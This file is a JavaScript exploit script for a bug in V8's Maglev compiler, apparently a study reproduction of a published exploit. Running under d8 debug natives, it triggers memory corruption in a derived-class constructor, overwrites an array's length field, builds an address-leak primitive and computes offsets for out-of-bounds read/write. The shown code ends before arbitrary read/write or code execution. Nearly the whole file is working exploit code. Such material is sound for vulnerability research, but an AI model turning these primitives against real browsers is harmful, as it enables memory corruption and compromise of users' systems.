class Helpers {
    constructor () {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);

        this.roots = new Array(0x30000);
        this.index = 0;

    }

    nop_nop() {

    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }
    print_hex(f) {
        console.log('0x' + this.f64toi64(f).toString(16));
    }
    hex_to_dbl(hexString) {
        if (hexString.startsWith('0x')) {
            hexString = hexString.substring(2);
        }

        for (let i = 0; i < 8; i++) {
            const byte = hexString.substring(hexString.length - (i + 1) * 2, hexString.length - i * 2);
            this.u8[i] = parseInt(byte, 16);
        }

        const float64 = new Float64Array(this.u8.buffer);
        return float64[0];
    }
    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    add_ref(object) {
        this.roots[this.index++] = object;
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }
    trap() {
        while (1) {
        }
    }
}
var helper = new Helpers();

var v;
var empty_object = {};
let corrupted_instance = null;

class A { }
class B extends A {
    constructor () {
        v = new.target;
        let objArr = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object];
        super();
        gc();
        let floatArr = [1.1];

        this.x = objArr;
        this.a = floatArr;
    }
}

function gc() {
    for (let i = 0; i < 1000; i++) {
        new ArrayBuffer(0x10000);
    }
}

function debug_print(name, obj) {
    console.log(`Debug of ${name}`);
    % DebugPrint(obj);
}

function trigger_bug() {
    for (let i = 0; i < 100; i++) {
        if (i < 90) gc();
    }

    % PrepareFunctionForOptimization(B);
    corrupted_instance = new B();

    for (let i = 0; i < 100; i++) {
        % OptimizeMaglevOnNextCall(B);
        corrupted_instance = new B();
    }
    corrupted_instance.x[5] = 0x10000; // QUESTION: why can not corrupt outside this function
}

function addrof_tmp(obj) {
    corrupted_instance.x[0] = obj;               // x holds objects that need to be leaked
    helper.f64[0] = corrupted_instance.a[0];     // set ArrayBuffer with the first element of a, which point to the object  
    return helper.u32[0];                    // get the last 32 bits of the address due to pointer compression
}

function exploit() {
    print("[+] Triggering the bug...");
    for (let i = 0; i < 100; i++) {
        if (i < 90) gc();
    }

    % PrepareFunctionForOptimization(B);
    corrupted_instance = new B();

    for (let i = 0; i < 100; i++) {
        % OptimizeMaglevOnNextCall(B);
        corrupted_instance = new B();
    }
    // debug_print('corrupted_instance.x', corrupted_instance.x);
    // debug_print('corrupted_instance.a', corrupted_instance.a);

    // let objectThatNeedToBeLeaked = { a: 1 };
    // debug_print(objectThatNeedToBeLeaked);
    // print("[+] Leaking the object address...");
    // let leakedObjectAddress = addrof_tmp(objectThatNeedToBeLeaked);
    // print("[+] Leaked object address: 0x" + leakedObjectAddress.toString(16));

    print("[+] Corrupting the metadata (length) of corrupted_instance.a ..");
    corrupted_instance.x[5] = 0x10000;
    if (corrupted_instance.a.length != 0x10000) {
        print(`[+] Initial corruption failed! Expected: ${0x10000}, got: ${corrupted_instance.a.length}`);
    } else {
        print(`[+] Initial corruption succeeded!`);
        // debug_print('corrupted_instance.x', corrupted_instance.x);
        // debug_print('corrupted_instance.a', corrupted_instance.a);
    }

    print("Perfoming read/write out of bounds...");
    while (true) {
        let rwarr = [1.1, 2.2, 3.3];
        let rwarr_addr = addrof_tmp(rwarr);
        let a_addr = addrof_tmp(corrupted_instance.a);

        // If our target array to corrupt does not lie after our corrupted array, then
        // we can't do anything. Bail and retry the exploit.
        if (rwarr_addr < a_addr) {
            // print("[+] Target array does not lie after corrupted array. Retrying...");
        } else {
            print(`[+] Address of corrupted_instance.a: 0x${a_addr.toString(16)}`);
            print(`[+] Address of rwArr: 0x${rwarr_addr.toString(16)}`);
            debug_print(`corrupted_instance.a`, corrupted_instance.a);
            debug_print(`rwarr`, rwarr);
            
            print("[+] Calculating the offset...");
            let offset = (rwarr_addr - a_addr) + 0xc; // 0xc is the offset from the metadata of rwarr to the backing storage
            if ((offset % 8) != 0) {
                offset -= 4; // turn back 4 bytes if the offset is not divisible by 8 (each element is 8 bytes long), because we need to convert it to number of elements used for changing the backing storage of rwarr through corrupted_instance.a
            }
            print("[+] Offset: " + offset); // in general, offset is the distance from a_addr to backing storage pointer of rwarr
            print("[+] Address of backing storage pointer of rwarr: " + (a_addr + offset).toString(16));

            let marker42_idx = offset / 8; // index of an element in backing storage pointer of corrupted_instance.a that points to backing storage pointer of rwarr
            marker42_idx += 2;             // +2 (=16/8) to skip the size of FixedDoubleArray of corrupted_instance.a (in the original blog, they use a larger array so the increment is 9 (=72/8))

            print("[+] Index of an element of backing storage of corrupted_instance.a that points to backing storage of rwarr: " + marker42_idx);
            let a_backing_store_addr = a_addr - 0x10;
            if (a_backing_store_addr + marker42_idx * 8 != rwarr_addr + 0x8) {
                print(`[+] Failed to calculate the index! Expected: ${rwarr_addr + 0x8}, got: ${a_backing_store_addr + marker42_idx * 8}`);
            } else {
                print("[+] Calculated index successfully!");
            }
            break;
        }
    }
}

exploit();








